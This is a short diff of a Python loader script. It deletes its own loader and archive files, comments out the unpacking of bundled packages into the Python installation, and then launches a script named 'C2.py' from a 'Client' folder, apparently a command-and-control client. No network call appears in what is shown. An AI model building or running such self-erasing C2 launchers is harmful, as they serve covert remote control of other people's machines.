@@ -33,11 +33,11 @@ os.remove("pack.txt")
 os.remove("client.zip")
 os.remove("loader.py")
 python = sys.executable
-libpath = pathlib.Path(python).parent / "Lib" 
-print("dir")
-os.makedirs(libpath / "site-packages",exist_ok=True)
-print("ex")
-shutil.unpack_archive("site-packages.zip",libpath / "site-packages")
+# libpath = pathlib.Path(python).parent / "Lib" 
+# print("dir")
+# os.makedirs(libpath / "site-packages",exist_ok=True)
+# print("ex")
+# shutil.unpack_archive("site-packages.zip",libpath / "site-packages")
 print("start")
 
 os.system(f"cd Client && \"{python}\" C2.py")
